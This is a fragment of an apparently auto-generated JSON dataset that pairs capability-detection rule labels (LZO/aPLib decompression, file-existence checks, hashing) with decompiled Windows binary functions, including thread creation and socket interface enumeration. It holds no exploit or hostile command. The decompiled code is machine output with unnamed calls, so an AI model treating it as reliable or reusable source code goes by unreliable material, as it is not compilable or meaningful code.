        "decompiled_code": "\nvoid __cdecl fcn.00452cbc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418428();\n    fcn.004502c0();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.0041848c(&var_20h, \n                 ((*(iVar1 + 0x58) - *(iVar1 + 0x50)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.00450170();\n    return;\n}\n",
        "token_count": 180
    },
    "0046c000": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c000(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t in_CX;\n    int16_t in_DX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX + -0x101 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX - 0x101U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_DX - 0x101U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX + -1 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX - 1U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_CX - 1U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xd) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h + -4 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 4;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h - 4U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = (arg_8h - 4U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xc;\n    }\n    iVar4 = 0;\n    puVar3 = 0x494eb8;\n    if (0 < arg_8h) {\n        do {\n            if (*(in_EAX + 0x16b8) < 0xe) {\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xa7a + *puVar3 * 4) << (*(in_EAX + 0x16b8) & 0x1f)\n                ;\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n            }\n            else {\n                uVar1 = *(in_EAX + 0xa7a + *puVar3 * 4);\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n            }\n            iVar4 = iVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    fcn.0046b914();\n    fcn.0046b914();\n    return;\n}\n",
        "token_count": 1748
    },
    "00475f44": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475f44(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x475f5d;\n    fcn.004059cc();\n    puStack28 = 0x475f65;\n    fcn.004059cc();\n    puStack28 = 0x475f6d;\n    fcn.004059cc();\n    uStack32 = 0x475ff6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.00405584();\n    fcn.00405530();\n    fcn.00405584();\n    fcn.00405584();\n    fcn.00405584();\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00483c98, uVar1, 0, arg_8h + -4);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x475ffd);\n    return;\n}\n",
        "token_count": 321
    },
    "00404124": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00404124(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "0041f530": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f530(uint param_1, int32_t param_2)\n\n{\n    if ((-0x81 < param_2) && (param_2 < 0x80)) {\n        fcn.0041f6b4();\n        fcn.0041f4b8();\n        return;\n    }\n    if ((param_2 < -0x8000) || (0x7fff < param_2)) {\n        fcn.0041f6b4();\n        fcn.0041f4b8();\n    }\n    else {\n        fcn.0041f6b4();\n        fcn.0041f4b8();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004400f4": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t fcn.004400f4(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    iVar1 = sub.user32.dll_GetParent();\n    while ((iVar1 != 0 && (uVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xffffffec),  (uVar2 & 0x80) == 0x80))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    if (iVar1 == 0) {\n        if (*(*0x49ac1c + 0x44) != 0) {\n            uVar3 = fcn.00458594(0xffffffec);\n            uVar2 = sub.user32.dll_GetWindowLongA(uVar3);\n            if ((uVar2 & 0x80) == 0) {\n                iVar1 = fcn.00458594();\n                return iVar1;\n            }\n        }\n        iVar1 = *(*0x49ac1c + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "004050e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004050e8(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x4987cc != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x4987cc == ppiVar1) {\n            *in_FS_OFFSET = **0x4987cc;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x4987cc) {\n                *ppiVar1 = **0x4987cc;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00407644": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00407644(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040763c();\n    if (iVar1 != 0) {\n        if (*0x4927b8 == -1) {\n            fcn.00405470();\n        }\n        iVar1 = fcn.00407630();\n        if (iVar1 == 0) {\n            fcn.00405470();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x4927b8, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0040a224": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040a224(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_ch;\n    iVar1 = sub.kernel32.dll_SetFilePointer_1();\n    if (iVar1 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 != 0) {\n            lpDistanceToMoveHigh = 0xffffffff;\n        }\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar1);\n}\n",
        "token_count": 138
    },
    "0040a274": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a274(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040a298": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a298(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040a490": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a490(int32_t param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    *(param_1 + 0x18) = ~param_2 & 0x16;\n    uVar1 = fcn.004059dc(param_1 + 0x20);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    *(param_1 + 0x1c) = iVar2;\n    if (iVar2 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n    }\n    else {\n        iVar2 = fcn.0040a40c();\n        if (iVar2 != 0) {\n            fcn.0040a504();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 188
    },
    "0040a504": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040a504(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1c) != -1) {\n        sub.kernel32.dll_FindClose_1(*(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040d550": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d550(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40d5b5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x4988f0) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040d59f;\n    }\n    fcn.00405728();\n    uVar1 = fcn.00409f20();\n    *(iVar2 * 4 + 0x4988f0) = uVar1;\ncode_r0x0040d59f:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40d5bc;\n    uStack24 = 0x40d5b4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 274
    },
    "004184b4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004184b4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "0041c6b8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c6b8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00419910();\n    if (iVar1 != -1) {\n        fcn.004197a8();\n    }\n    iVar1 = fcn.00419910();\n    if (iVar1 < 0) {\n        fcn.0041975c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0041ca4c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041ca4c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004166ec();\n    if (iVar1 == -1) {\n        fcn.0041ca14();\n    }\n    return iVar1;\n}\n",
        "token_count": 61
    },
    "004368d8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004368d8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004368a4();\n    if (iVar1 == -1) {\n        fcn.00433a30();\n    }\n    fcn.00436780();\n    return;\n}\n",
        "token_count": 65
    },
    "00438394": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00438394(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.004379c0();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.004379c0();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0043bc78();\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "00443eb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00443eb0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.00443f6c();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 127
    },
    "0044421c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044421c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "00448c78": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448c78(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x448ca3;\n    himl = param_2;\n    fcn.00418464(&fcn.00448c78::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x448cab;\n    fcn.00449914();\n    uStack72 = 0x448e11;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x448cc5;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.00429388();\n    uStack84 = 0x448df4;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x448ce4;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x448cf2;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x448cfe;\n    var_10h = fcn.00429388();\n    uStack96 = 0x448dd7;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.0042a78c();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.0042995c();\n                fcn.00425308();\n                uVar2 = fcn.004256c0(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.0042995c();\n                fcn.00425308();\n                fcn.004256c0(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.00448848();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x448dde;\n    uStack100 = 0x448dd6;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 789
    },
    "004500c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004500c0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00450c88();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.00450170();\n    }\n    else {\n        fcn.00451b90();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x6c))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0046f860": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0046f860(void)\n\n{\n    uint in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 0x16;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x46fe3b;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046f860::var_20h;\n    var_14h = in_EAX;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.00421670();\n    var_18h = fcn.00404620();\n    piVar1 = fcn.00404620();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421e4c();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            iVar2 = var_38h;\n            (**(*var_18h + 0xc))(var_4h);\n            (**(*var_18h + 0xc))(0x46fe8c, var_34h);\n            fcn.00422014();\n            fcn.0040a694();\n            var_34h = 0x46fe8c;\n            var_38h = 0x46f943;\n            (**(*var_18h + 0xc))();\n            var_8h = 0x46f950;\n            fcn.00422014();\n            var_8h = var_44h;\n            var_ch = 0x46fe8c;\n            var_10h = 0x46fe98;\n            var_14h = 0x46fe54;\n            var_18h = 0x46fe8c;\n            var_1ch = 0x46fea8;\n            var_20h = 0x46feb4;\n            fcn.004058e0();\n            var_1ch = var_1ch + 1;\n        } while (iVar2 != 1);\n    }\n    fcn.0042171c();\n    (**(*var_18h + 0x44))();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421e4c();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            (**(*var_18h + 0xc))(var_8h);\n            (**(*var_18h + 0xc))(0x46fe8c, var_4ch);\n            fcn.00422014();\n            fcn.0040a694();\n            (**(*var_18h + 0xc))(0x46fe8c);\n            var_8h = 0x46fa3b;\n            fcn.00422014();\n            var_8h = var_5ch;\n            var_ch = 0x46fe8c;\n            var_10h = 0x46fec0;\n            var_14h = 0x46fe54;\n            var_18h = 0x46fe8c;\n            var_1ch = 0x46fea8;\n            var_20h = 0x46feb4;\n            fcn.004058e0();\n            var_1ch = var_1ch + 1;\n        } while (var_50h != 1);\n    }\n    fcn.0042171c();\n    (**(*var_18h + 0x44))();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421d84();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.0042171c();\n            (**(*var_18h + 0xc))();\n            fcn.00405864();\n            fcn.00421890();\n            fcn.00421e4c();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_ch);\n                (**(*piVar1 + 0xc))(0x46fe8c, var_6ch);\n                fcn.00422014();\n                var_30h = var_70h;\n                (**(*piVar1 + 0xc))(0x46fe8c);\n                fcn.00422014();\n                (**(*piVar1 + 0xc))(0x46fe8c, var_78h);\n                fcn.00422014();\n                (**(*piVar1 + 0xc))(0x46ff88, var_80h);\n                var_14h = 0x46fc00;\n                fcn.00422014();\n                var_14h = var_88h;\n                var_18h = 0x46fe8c;\n                var_1ch = 0x46ff94;\n                var_20h = 0x46feb4;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    fcn.0042171c();\n    (**(*var_18h + 0x44))();\n    (**(*piVar1 + 0x44))();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421d84();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.0042171c();\n            (**(*var_18h + 0xc))();\n            fcn.00405864();\n            fcn.00421890();\n            fcn.00421e4c();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_10h);\n                (**(*piVar1 + 0xc))(0x46fe8c, var_98h);\n                fcn.00422014();\n                var_30h = var_9ch;\n                (**(*piVar1 + 0xc))(0x46fe8c);\n                fcn.00422014();\n                (**(*piVar1 + 0xc))(0x46fe8c, var_a4h);\n                var_14h = 0x46fdb3;\n                fcn.00422014();\n                var_14h = var_ach;\n                var_18h = 0x46fe8c;\n                var_1ch = 0x46ff94;\n                var_20h = 0x46feb4;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    iVar2 = var_10h;\n    fcn.004058e0(var_10h, var_ch, var_8h, var_4h);\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00404650();\n    *in_FS_OFFSET = iVar2;\n    fcn.00405554(0x46fe42);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2401
    },
    "00473324": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00473324(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff954;\n    int32_t iStack1680;\n    uint uStack1676;\n    uchar *puStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    int32_t iStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    int32_t in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1648 = &stack0xfffffffc;\n    uStack1652 = 0x473455;\n    iStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    uStack1660 = 0x473351;\n    fcn.00405530();\n    uStack1660 = 0;\n    uStack1664 = 1;\n    uStack1668 = 2;\n    puStack1672 = 0x47335c;\n    iVar1 = sub.wsock32.dll_socket();\n    s = iVar1;\n    if (iVar1 != -1) {\n        uStack1676 = 0x473427;\n        iStack1680 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff970;\n        puStack1672 = &stack0xfffffffc;\n        iVar2 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar1, 0x4004747f, 0, 0, &fcn.00473324::var_658h, 0x400, &fcn.00473324::var_8h, 0, 0);\n        if ((iVar2 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar3 = &fcn.00473324::var_654h;\n            do {\n                var_1ch = *puVar3;\n                in = puVar3[1];\n                uStack24 = puVar3[2];\n                uStack20 = puVar3[3];\n                sub.wsock32.dll_inet_ntoa(puVar3[1]);\n                fcn.00405728();\n                fcn.00405818();\n                var_1ch = puVar3[0xc];\n                in = puVar3[0xd];\n                uStack24 